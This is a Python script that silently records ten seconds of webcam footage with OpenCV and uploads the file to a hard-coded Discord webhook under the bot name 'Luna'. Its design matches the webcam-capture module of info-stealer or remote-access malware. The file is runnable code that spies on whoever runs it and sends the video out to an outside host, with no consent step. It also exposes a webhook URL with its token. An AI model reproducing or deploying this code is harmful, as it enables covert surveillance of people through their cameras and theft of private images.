import cv2
import os
import tempfile
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import json

# Function to record video from webcam(s)
def record_video(video_duration=10, num_cameras=1):
    # Get the temporary directory path to store videos
    temp_path = tempfile.gettempdir()

    # Create a folder to store the webcam videos
    video_dir = os.path.join(temp_path, "Webcam")
    os.makedirs(video_dir, exist_ok=True)

    # Try to open all available cameras
    cameras = []
    for i in range(num_cameras):
        cap = cv2.VideoCapture(i)
        if not cap.isOpened():
            print(f"Camera {i} could not be opened.")
            continue
        cameras.append(cap)

    if len(cameras) == 0:
        print("No cameras found!")
        return None

    # Set video properties: frame width, height, and FPS
    frame_width = int(cameras[0].get(cv2.CAP_PROP_FRAME_WIDTH))
    frame_height = int(cameras[0].get(cv2.CAP_PROP_FRAME_HEIGHT))
    fps = 20.0  # Frames per second

    # Define the output video file path
    video_path = os.path.join(video_dir, "webcam_video.mp4")

    # Create a VideoWriter object to save the video
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # Codec for mp4
    out = cv2.VideoWriter(video_path, fourcc, fps, (frame_width, frame_height))

    print(f"Recording video from {num_cameras} camera(s) for {video_duration} seconds...")

    # Record the video for the specified duration
    for _ in range(int(fps * video_duration)):  # total number of frames
        for cap in cameras:
            ret, frame = cap.read()
            if ret:
                out.write(frame)  # Write the frame to the video file
            else:
                print(f"Failed to capture frame from camera.")
                break

    # Release all camera resources and video writer
    for cap in cameras:
        cap.release()

    out.release()
    print(f"Video saved to: {video_path}")

    return video_path

# Function to send the recorded video to a Discord webhook
def send_video_to_discord(video_path):
    webhook_url = "https://discord.com/api/webhooks/1205108171769905202/-nPkymxlUmsdjFWCRXHDpjWO6opbKHQ8aHaevZFju-5xxswy5yReNuJSLQdLpnK7aKki"

    if not video_path:
        print("No video to send.")
        return

    # Prepare the Discord webhook payload
    webhook_data = {
        "username": "Luna",
        "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
        "embeds": [
            {
                "color": 5639644,
                "title": "Webcam Video",
                "description": "Captured webcam video",
            }
        ]
    }

    # Open and send the video to the Discord webhook
    with open(video_path, "rb") as f:
        video_data = f.read()
        encoder = MultipartEncoder({
            'payload_json': json.dumps(webhook_data),  # The JSON data
            'file': ('video.mp4', video_data, 'video/mp4')  # The video file
        })

        # Send the POST request to the provided webhook URL
        response = requests.post(webhook_url, headers={'Content-type': encoder.content_type}, data=encoder)
        if response.status_code == 204:
            print(f"Successfully sent video to Discord.")
        else:
            print(f"Failed to send video. Status: {response.status_code}, {response.text}")

# Main function to record and send video
def main():
    # Record a 10-second video from the first camera
    video_path = record_video(video_duration=10, num_cameras=1)

    # Check if video was recorded before sending
    if video_path:
        send_video_to_discord(video_path)
    else:
        print("Video was not recorded.")

# Entry point of the script
if __name__ == "__main__":
    main()
